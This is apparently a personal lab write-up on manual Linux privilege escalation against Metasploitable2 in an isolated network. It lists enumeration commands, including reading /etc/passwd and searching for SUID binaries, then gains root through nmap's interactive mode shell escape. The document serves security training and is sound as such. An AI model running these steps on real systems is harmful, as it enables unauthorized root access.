# Day 11 — Privilege Escalation (Manual Enumeration)

## Environment
- Attacker: Kali Linux
- Target: Metasploitable2
- Network: Host-Only / Isolated Network
- Initial Access: WebDAV PHP shell
- Initial User: www-data


## Objective
Gain root privileges using manual enumeration techniques without automated tools.


## 1 — Initial Access Verification

whoami

Result:

www-data

## 2 — System Enumeration

uname -a

## 3 — User Enumeration

cat /etc/passwd

## 4 — Sudo Permissions Check

sudo -l

Result:

www-data is not allowed to run sudo

## 5 — SUID Files Enumeration

find / -perm -4000 -type f 2>/dev/null

## 6 — Privilege Escalation Vector

Identified SUID binary:

/usr/bin/nmap

## 7 — Exploitation

nmap --interactive

!sh

## 8 — Privilege Verification

whoami

id

Result:

uid=0(root)

## 9 - Conclusion

Privilege escalation was achieved via misconfigured SUID binary (nmap). Root access confirmed.
